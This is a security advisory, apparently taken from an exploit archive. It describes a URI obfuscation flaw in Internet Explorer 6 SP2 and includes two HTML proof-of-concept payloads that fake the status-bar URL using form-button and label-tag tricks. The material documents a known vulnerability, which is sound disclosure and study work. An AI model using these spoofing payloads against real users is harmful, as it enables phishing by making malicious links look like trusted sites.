@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/11565/info
+
+Microsoft Internet Explorer is reported prone to a URI obfuscation weakness. The issue is due to a failure of the affected application to properly handle specially crafted HTML anchor URI tags and various form tags.
+
+This issue may be leveraged by an attacker to display false information in the status bar of an unsuspecting user, allowing an attacker to present web pages to users that seem to originate from a trusted location.
+
+This vulnerability is reported to affect Internet Explorer 6 SP2, other versions might also be affected.
+
+<base href="http://www.example1.com">
+
+<a href=><form action="http://www.example2.com"
+method="get"><INPUT style="BORDER-RIGHT: 0pt; BORDER-TOP: 0pt;
+FONT-SIZE: 10pt; BORDER-LEFT: 0pt;
+CURSOR: hand; COLOR: blue; BORDER-BOTTOM: 0pt; BACKGROUND-COLOR:
+transparent;TEXT-DECORATION: underline" type=submit
+value=http://www.example1.com></form></a>
+
+Another proof of concept exploit has been made available. This method employs the 'id' parameter embedded inside an anchor tag that is controlled by a 'label' tag, allowing the label tag to control what value is presented to an unsuspecting user:
+
+<body style="color: WindowText; background-color: Window;">
+<div>IE/OE Restricted Zone Status Bar Spoofing</div>
+<div>Tested on Windows XP with SP2 installed.</div>
+<p><a id="SPOOF" href="http://www.example.com/?maliciousContents"></a></p>
+<div>
+<a href="http://www.example.com/?trustedSite">
+<table>
+<caption>
+<a href="http://www.example.com/?trustedSite ">
+<label for="SPOOF">
+<u style="cursor: pointer; color: blue">
+http://www.example.com/?trustedSite
+</u>
+</label>
+</a>
+</caption>
+</table>
+</a>
+</div>
